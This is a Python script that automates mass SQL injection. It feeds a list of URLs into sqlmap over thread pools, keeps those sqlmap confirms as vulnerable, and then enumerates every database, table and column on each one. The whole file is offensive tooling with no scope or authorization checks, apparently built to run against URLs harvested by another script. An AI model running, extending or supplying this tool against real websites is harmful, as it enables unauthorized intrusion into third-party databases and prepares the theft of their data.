import subprocess
import os
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Initializes a lock for thread-safe printing and list appending
print_lock = Lock()

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list and strips whitespace
        data = [line.strip() for line in f.readlines() if line.strip()]
    # Returns the data
    return data

# Function to verify a single URL (used by the thread pool)
def verify_single_url(url, verified_urls):
    # Runs sqlmap with --batch to skip prompts and --smart for speed
    result = subprocess.run(["sqlmap", "-u", url, "--batch", "--smart", "--level=1"], capture_output=True, text=True)

    # Uses the lock to prevent overlapping output
    with print_lock:
        # Checks the standard output for is vulnerable
        if "is vulnerable" in result.stdout:
            # Outputs the url is confirmed as vulnerable
            print(f"[+] Confirmed: {url}")
            # Adds the url to the verified urls list safely
            verified_urls.append(url)
        else:
            # Outputs the url was a false positive
            print(f"[-] False Positive: {url}")

# Function to extract the databases
def extract_databases(url):
    # Stores the databases
    databases = []

    # Runs sqlmap as a subprocess to get databases
    database_scan = subprocess.run(["sqlmap", "-u", url, "--dbs", "--batch", "--threads=10"], capture_output=True, text=True)

    # Loops over the split lines of the output
    for line in database_scan.stdout.splitlines():
        # Checks for lines with a database marker
        if "[*]" in line and line != "[*] starting at":
            # Extracts the database name from the end of the line
            database = line.split()[-1]
            # Adds to the databases list
            databases.append(database)

    # Creates unique database list using a set
    unique_databases = list(set(databases))

    # Returns the unique databases
    return unique_databases

# Function to extract the tables
def extract_tables(url, databases):
    # Stores the database tables mapping
    database_tables = {}

    # Loops over the databases provided
    for database in databases:
        # Initialize the list for the specific database to avoid overwriting
        database_tables[database] = []
        
        # Runs sqlmap to get tables for the specific database
        result = subprocess.run(["sqlmap", "-u", url, "-D", database, "--tables", "--batch", "--threads=10"], capture_output=True, text=True)

        # Loops over the output lines
        for line in result.stdout.splitlines():
            # Checks for table grid borders and ignores header keywords
            if "|" in line and not any(x in line for x in ["Table", "+---", "---"]):
                # Splits the line into parts
                parts = [p.strip() for p in line.split("|") if p.strip()]
                # Checks if the parts contain a table name
                if parts:
                    # Adds the table name to the correct database key
                    database_tables[database].append(parts[0])
    # Returns the dictionary of databases and tables
    return database_tables

# Function to extract the columns
def extract_columns(url, db_tables_map):
    # Stores the columns data in a nested dictionary
    column_data = {}

    # Loops over each database in the map
    for database, tables in db_tables_map.items():
        # Initializes the database entry
        column_data[database] = {}
        
        # Loops over the tables within that database
        for table in tables:
            # Initializes the list for the specific table
            column_data[database][table] = []
            
            # Runs sqlmap to get columns for the specific table
            result = subprocess.run(["sqlmap", "-u", url, "-D", database, "-T", table, "--columns", "--batch", "--threads=10"], capture_output=True, text=True)

            # Loops over the output lines
            for line in result.stdout.splitlines():
                # Checks for the column grid and ignores headers
                if "|" in line and not any(x in line for x in ["Column", "+---", "Type"]):
                    # Splits the line to find the column name
                    parts = [p.strip() for p in line.split("|") if p.strip()]
                    # Checks if a column name was found
                    if parts:
                        # Adds the column name to the table list
                        column_data[database][table].append(parts[0])

    # Returns the complete column data
    return column_data

# Function to filter out any results using multiple threads
def filter_results_threaded(data):
    # Stores the verified urls
    verified_urls = []
    
    # Creates a thread pool with a limit of 10 workers
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Submits each url in the data to the thread pool
        for url in data:
            # Executes the verification function for the url
            executor.submit(verify_single_url, url, verified_urls)
            
    # Returns verified urls
    return verified_urls

# Function to process a single verified URL entirely
def process_target(url):
    # Uses the lock to announce the target
    with print_lock:
        # Outputs the current target being processed
        print(f"\n--- Starting Threaded Process: {url} ---")

    # Function to extract the databases
    dbs = extract_databases(url)
    
    # Function to extract the tables
    db_map = extract_tables(url, dbs)
    
    # Function to extract the columns
    final_results = extract_columns(url, db_map)

    # Uses the lock for the final status update
    with print_lock:
        # Outputs that the target scanning is finished
        print(f"[!] Finished scanning {url}")

# Main executable function
def main():
    # Logs the starting time
    start_time = time.perf_counter() 

    # Asks for the path of the results file
    results_path = input("[+] Please enter the results file path: ").strip()

    # Checks if the input is a file path
    if os.path.isfile(results_path):

        # Outputs that data is being imported
        print("[+] Importing data")

        # Function to bring in the results data
        raw_data = import_results_data(results_path)

        # Outputs that data is being filtered with threads
        print("[+] Filtering data (Threaded)")

        # Stores the filtered verified urls using the threaded function
        verified_urls = filter_results_threaded(raw_data)

        # Creates a thread pool for full target processing
        with ThreadPoolExecutor(max_workers=5) as executor:
            # Loops over each verified url found
            for url in verified_urls:
                # Submits the full target scan to the pool
                executor.submit(process_target, url)

    else:
        # Outputs that the path provided was invalid
        print("[!] Invalid file path")

    # Gets end time and calculates the elapsed time
    elapsed = time.perf_counter() - start_time

    # Outputs the total time taken
    print(f"\n[âœ“] Finished in {elapsed:.2f} seconds")

# Runs the main function
if __name__ == "__main__":
    # Calls the main function
    main()